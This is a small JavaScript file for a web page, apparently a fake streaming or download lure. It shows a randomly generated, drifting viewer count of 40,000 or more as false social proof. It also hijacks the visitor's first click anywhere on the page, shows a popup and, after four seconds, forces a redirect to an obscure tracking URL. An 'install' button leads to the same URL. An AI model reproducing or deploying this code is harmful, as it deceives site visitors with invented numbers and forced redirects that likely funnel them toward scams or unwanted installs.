let viewers = Math.floor(Math.random()*40000)+40000;

setInterval(()=>{
  viewers += Math.floor(Math.random()*300-150);
  if(viewers<1000) viewers=1000;
  document.getElementById("viewers").innerText = viewers.toLocaleString();
},2000);


// ===== POPUP SYSTEM =====
const redirectURL = "https://eavesdropbogusye.com/vk9pvyw8p?key=6c739a905f40e090a16cfdd6a851e970";
let popupShown = false;

document.addEventListener("click", function(e){

  if(!popupShown){
    e.preventDefault();
    popupShown = true;

    document.getElementById("popup").style.display = "flex";

    setTimeout(function(){
      window.location.href = redirectURL;
    },4000);
  }

}, true);

document.getElementById("installBtn").addEventListener("click", function(){
  window.location.href = redirectURL;
});
